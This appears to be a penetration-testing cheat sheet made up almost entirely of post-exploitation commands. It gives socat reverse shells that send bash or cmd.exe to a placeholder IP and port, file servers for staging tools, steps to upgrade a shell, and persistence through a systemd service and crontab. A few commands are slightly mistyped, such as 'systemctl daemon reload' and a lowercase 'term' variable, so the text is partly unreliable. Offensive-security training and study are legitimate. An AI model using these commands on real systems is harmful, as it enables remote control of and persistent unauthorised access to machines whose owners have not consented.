### SoCAT
```
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
```
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>
```
```
socat.exe exec:'cmd.exe',pipes TCP4:<IP>:<PORT>
```
### Serving Files
- Python3
```
python3 -m http.server <PORT> --directory <DIRECTORY>
```
- SMB
```
impacket-smbserver <SHARE> <DIRECTORY> -port <PORT> -username <USERNAME> -password <PASSWORD> -smb2support
```
- FTP
```
python3 -m pyftpdlib -d <DIRECTORY> -p <PORT> -u <USERNAME> -P <PASSWORD>
#Add -w for write permission
```
### Beautify Shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
```
script -qc /bin/bash /dev/null ^Z
stty -a
stty raw -echo
fg
fg (YES YOU TYPE IT TWICE)
export term=xterm
stty rows <ROWS> columns <COLUMNS>
```
### Persistence
- Create a new service
```
vim /etc/systemd/system/<SERVICE>.service
```
- Template for service
```
[Unit]
Description=<DESCRIPTION>

[Service]
Type=simple
Restart=always
ExecStart=<PATH_TO_EXECUTABLE>

[Install]
WantedBy=multi-user.target
```
- Loading the service
```
systemctl daemon reload
```
```
systemctl enable <SERVICE>
```
- Creating a new CronJob
```
crontab -e
```
- CronTab Format
```
[minute] [hour] [day of month] [month] [day of week] [command]
```